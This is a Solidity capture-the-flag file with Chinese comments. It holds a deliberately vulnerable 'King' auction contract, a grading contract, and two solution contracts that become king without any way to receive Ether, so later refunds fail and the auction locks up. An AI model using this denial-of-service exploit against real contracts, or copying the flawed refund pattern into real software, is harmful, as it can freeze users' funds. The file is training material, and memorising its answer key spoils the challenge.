// 题目详情:updateWaitTime
// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

contract King {
    address payable king;
    uint public prize = 0;
    address payable public owner;
    uint256 public score;
    uint256 public nums;

    constructor() public payable {
        owner = msg.sender;  
        king = msg.sender;
    }

    receive() external payable {
        require(msg.value > prize || msg.sender == owner, "error1");
        require(king.send(msg.value), "error2");
        king = msg.sender;
        prize = msg.value;

        nums++;
    }

    function _king() public view returns (address payable) {
        return king;
    }
}

contract Check {
    address public victim;
    King public king;
    uint public prize;
    //你的成绩
    uint256 public score;
    address private owner;

    modifier onlyWhitelist(){
        require(msg.sender == owner || msg.sender == address(this));
        _;
    }
    constructor() public {
        king = new King();
        victim = address(king);
        owner = msg.sender;
    }

    function getPriceNow() public {
        prize = king.prize();
    }

    function check() public onlyWhitelist payable{
        require(msg.value > king.prize());
        victim.call{gas:1000000}{value : msg.value}("");
    }

    //检查时必须确保value > prize （确保msg.value足够进行一次竞拍）
    //如果你是做题者，请重新部署一个攻击合约来模拟新的竞拍者再进行此操作
    function isCompleted() public payable{
        score = 0;
        
        //如果你参与过竞拍,50分
        if(king.nums() >= 1){
            score = 50;
            address kingbefore = king._king();
            this.check{value : msg.value}();
            address kingafter = king._king();
            //如果你成功使此竞拍系统宕机，100分
            if(kingbefore == kingafter){
                score = 100;
            }
        }
        
    }

    fallback() external payable {
        
    }
    
    receive() external payable{
        
    }

}

//你可以调用此合约的check函数验证你是否正确，之后可以回到check合约查询你的分数。
contract ToCheck {
    address  payable checkadr;
    constructor(address payable _check) public {
        checkadr = _check;
    }
    
    //请确保msg.value足够进行一次竞拍。
    function check() payable public {
        Check(checkadr).isCompleted{value : msg.value}();
    }
}
contract att{
    ToCheck toche;
    Check che;
    King vi;
    constructor(address payable addr1,address addr2)public {
        che = Check(addr1);
        toche = ToCheck(addr2);
        vi = che.king();
    }
    function attract() public payable {
        address(vi).call{value:10 wei}("");
        toche.check{value: 100 wei}();
    }
}

contract Exploit {
    Check public check;
    address public _victim;
    constructor(address payable _check) public {
        check = Check(_check);
        _victim = address(check.king());
    }

    function attack() public payable{
        // (bool suc,) = _victim.call.gas(1000000).value(msg.value)("");
        (bool suc,) = _victim.call{value : 10}("");
        require(suc);

        check.isCompleted{value : 100}();
    }
}

